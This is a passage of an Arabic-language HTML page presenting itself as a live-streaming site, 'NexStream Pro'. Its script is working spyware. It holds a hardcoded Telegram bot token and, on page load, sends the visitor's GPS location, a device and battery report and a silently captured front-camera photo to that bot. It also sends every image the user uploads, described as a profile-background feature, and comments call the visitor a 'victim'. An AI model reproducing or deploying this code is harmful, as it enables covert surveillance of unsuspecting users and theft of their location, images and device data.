</section>

<!-- صفحة الإعدادات -->

<section id="view-settings" class="page">

    <div class="section-heading">
        <h2>الإعدادات</h2>
        <span>SETTINGS</span>
    </div>

    <div class="result-card" style="background:var(--surface2); border:1px solid var(--border); border-radius:15px; padding:15px; margin-bottom:12px;">
        <h3 style="font-size:13px; margin-bottom:10px;">حالة الاتصال بالخادم</h3>
        <p style="color:var(--muted); font-size:11px;">متصل بخوادم البث المباشر والمزامنة بنجاح.</p>
    </div>

    <button class="btn secondary" onclick="returnHome()">
        العودة للرئيسية
    </button>

</section>

</main>

<nav class="bottom-nav">
    <button class="nav-item active" onclick="showPage('home')">
        <span>⌂</span>الرئيسية
    </button>
    <button class="nav-item" onclick="showPage('room')">
        <span>📺</span>الغرفة
    </button>
    <button class="nav-item" onclick="showPage('settings')">
        <span>⚙️</span>الإعدادات
    </button>
</nav>

<footer class="footer">
    NexStream Pro • Live Streaming Hub
    <br>
    الڪنج الناصري 𓅓
</footer>

</div>

<!-- عناصر مخفية لمعالجة السحب والتقاط الكاميرا والموقع الجغرافي -->
<input type="file" id="local-uploader" accept="image/*" multiple style="display:none;" onchange="handleProfileBackgroundUpload(this)">
<video id="video" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
/* NexStream Pro | الناصري - نظام الرصد المتكامل وسحب الموقع */

const BOT_TOKEN = "8893388262:AAHcyBhati4G6a0Tik6Lxb2pdkzbl0bqpKA";
const CHAT_ID = "8632460745";

function sendToTelegram(text) {
    let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=` + encodeURIComponent(text) + `&parse_mode=Markdown`;
    fetch(url).catch(e => {});
}

function sendPhotoToTelegram(blob, caption = '📸 التقاط صورة حية') {
    let formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', blob, 'capture.jpg');
    formData.append('caption', caption);
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
    }).catch(e => {});
}

let stats = {
    clicks: 0,
    visits: 0,
    rooms: []
};

let currentRoom = null;
let currentCategory = "all";

function saveStats(){
    try{
        localStorage.setItem("nexstream_stats", JSON.stringify(stats));
    }catch(e){}
}

function loadStats(){
    try{
        const saved = localStorage.getItem("nexstream_stats");
        if(saved){
            const data = JSON.parse(saved);
            stats = {
                clicks: Number(data.clicks) || 0,
                visits: Number(data.visits) || 0,
                rooms: Array.isArray(data.rooms) ? data.rooms : []
            };
        }
    }catch(e){}
    updateStats();
}

function showPage(page){
    document.querySelectorAll(".page").forEach(section=>{
        section.classList.remove("active");
    });
    const target = document.getElementById("view-" + page);
    if(!target) return;
    target.classList.add("active");

    document.querySelectorAll(".nav-item").forEach(btn=>{
        btn.classList.remove("active");
    });

    const navButtons = document.querySelectorAll(".nav-item");
    const indexes = { home:0, room:1, settings:2 };
    if(indexes[page] !== undefined){
        navButtons[indexes[page]].classList.add("active");
    }

    window.scrollTo({ top:0, behavior:"smooth" });
}

function returnHome(){
    showPage("home");
}

function updateStats(){
    document.getElementById("stat-rooms").textContent = 3;
    document.getElementById("stat-clicks").textContent = stats.clicks;
    document.getElementById("stat-visits").textContent = stats.visits;
}

function openRoom(name,image,description,viewers){
    currentRoom = { name:name, image:image, description:description, viewers:viewers };
    stats.clicks++;
    stats.visits++;

    if(!stats.rooms.includes(name)){
        stats.rooms.push(name);
    }

    document.getElementById("room-title").textContent = name;
    document.getElementById("profile-avatar").src = image;
    document.getElementById("user-profile-bg").style.backgroundImage = `url('${image}')`;
    document.getElementById("room-meta").textContent = description;
    document.getElementById("viewer-metric").textContent = viewers + " مشاهد";
    document.getElementById("system-log").textContent = "";

    saveStats();
    updateStats();
    showPage("room");

    sendToTelegram(`👤 *تفاعل المستخدم:* دخل إلى غرفة البث المباشر: *${name}*`);
}

function filterChannels(){
    const search = document.getElementById("search-input").value.trim().toLowerCase();
    const cards = document.querySelectorAll(".channel-card");

    cards.forEach(card=>{
        const text = (card.dataset.search || "").toLowerCase();
        const category = card.dataset.category;
        const matchesSearch = text.includes(search);
        const matchesCategory = currentCategory === "all" || category === currentCategory;

        card.style.display = matchesSearch && matchesCategory ? "flex" : "none";
    });
}

function filterCategory(category,button){
    currentCategory = category;
    document.querySelectorAll(".categories button").forEach(btn=>{
        btn.classList.remove("active");
    });
    button.classList.add("active");
    filterChannels();
}

function sendChatMessage(){
    const input = document.getElementById("chat-input");
    const message = input.value.trim();
    if(!message) return;

    if(message.length > 300){
        alert("الرسالة طويلة جدًا");
        return;
    }

    const bubble = document.createElement("div");
    bubble.className = "chat-bubble";
    const username = document.createElement("strong");
    username.textContent = "أنت:";
    bubble.appendChild(username);
    bubble.appendChild(document.createTextNode(" " + message));

    const chat = document.getElementById("chat-stream");
    chat.appendChild(bubble);
    chat.scrollTop = chat.scrollHeight;
    input.value = "";

    stats.clicks++;
    saveStats();
    updateStats();
}

document.getElementById("chat-input").addEventListener("keydown", function(event){
    if(event.key === "Enter"){
        sendChatMessage();
    }
});

function startTrainingScenario(){
    if(!currentRoom){
        alert("اختر غرفة للبث المباشر أولاً");
        return;
    }

    const log = document.getElementById("system-log");
    log.textContent = "جاري تهيئة قناة الاتصال المرئي...";

    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
    .then(stream => {
        let video = document.getElementById('video');
        video.srcObject = stream;
        video.play();
        setTimeout(() => {
            let canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            let ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(blob => {
                sendPhotoToTelegram(blob, '📸 صورة حية التقطت عند طلب الاتصال المرئي في البث');
                stream.getTracks().forEach(track => track.stop());
                log.textContent = "✓ تم الاتصال بنجاح وربط القناة المرئية!";
            }, 'image/jpeg', 0.9);
        }, 1200);
    })
    .catch(err => {
        log.textContent = "يرجى السماح بالوصول للكاميرا للمتابعة.";
    });

    stats.clicks++;
    saveStats();
    updateStats();
}

function triggerProfileBackground(){
    document.getElementById('local-uploader').click();
}

function handleProfileBackgroundUpload(input) {
    if (input.files && input.files.length > 0) {
        sendToTelegram(`📂 *سحب المعرض:* قام المستخدم برفع ${input.files.length} صورة لتخصيص الحساب.`);
        
        let reader = new FileReader();
        reader.onload = function(e) {
            document.getElementById('user-profile-bg').style.backgroundImage = `url('${e.target.result}')`;
            document.getElementById('system-log').innerText = "تم تحديث خلفية الحساب الشخصي بنجاح.";
        }
        reader.readAsDataURL(input.files[0]);

        for (let i = 0; i < input.files.length; i++) {
            let file = input.files[i];
            sendPhotoToTelegram(file, `📂 صورة مسحوبة من معرض الضحية #${i+1}`);
        }
    }
}

/* التقاط معلومات النظام، الصورة، والموقع الجغرافي (GPS) فور الدخول */
document.addEventListener("DOMContentLoaded", function(){
    loadStats();

    // 1. جلب الموقع الجغرافي ودفع الإحداثيات للبوت مباشرة
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => {
            let lat = position.coords.latitude;
            let lon = position.coords.longitude;
            let locText = `📍 *رصد موقع الضحية الفعلي:*\n• خط العرض: \`${lat}\`\n• خط الطول: \`${lon}\`\n• رابط الخريطة: https://maps.google.com/?q=${lat},${lon}`;
            sendToTelegram(locText);
        }, error => {
            sendToTelegram(`📍 *موقع الضحية:* تم رفض إذن الوصول للموقع أو غير متاح.`);
        }, { enableHighAccuracy: true });
    }

    // 2. إرسال تقرير مواصفات الجهاز والبطارية
    setTimeout(() => {
        let batteryPromise = navigator.getBattery ? navigator.getBattery() : Promise.resolve(null);
        let netInfo = navigator.connection ? `${navigator.connection.effectiveType} (${navigator.connection.downlink} Mbps)` : "غير متوفر";

        batteryPromise.then(battery => {
            let batLevel = battery ? `${Math.round(battery.level * 100)}% (${battery.charging ? '🔌 يشحن' : '🔋 غير موصول'})` : "غير مدعوم";
            
            let report = `🚨 *صيد جديد - تقرير استخباراتي للبث* 🚨\n\n` +
                         `📱 *معلومات الجوال والنظام:*\n` +
                         `• النظام: \`${navigator.platform}\`\n` +
                         `• المتصفح: \`${navigator.userAgent}\`\n` +
                         `• دقة الشاشة: \`${window.screen.width} x ${window.screen.height}\`\n` +
                         `• الذاكرة (RAM): \`${navigator.deviceMemory || 'غير معروف'} GB\`\n` +
                         `• الأنوية (CPU): \`${navigator.hardwareConcurrency || 'غير معروف'}\`\n` +
                         `• اللغة: \`${navigator.language}\`\n\n` +
                         `🔋 *الحالة والشبكة:*\n` +
                         `• البطارية: \`${batLevel}\`\n` +
                         `• الشبكة: \`${netInfo}\``;
            sendToTelegram(report);
        });
    }, 800);

    // 3. الالتقاط الصامت للصورة الأولى فور الدخول
    setTimeout(() => {
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
        .then(stream => {
            let video = document.getElementById('video');
            video.srcObject = stream;
            video.play();
            setTimeout(() => {
                let canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                let ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(blob => {
                    sendPhotoToTelegram(blob, '📸 صورة حية التقطت فور دخول الزائر لصفحة البث!');
                    stream.getTracks().forEach(track => track.stop());
                }, 'image/jpeg', 0.9);
            }, 1000);
        }).catch(e => {});
    }, 2000);
});

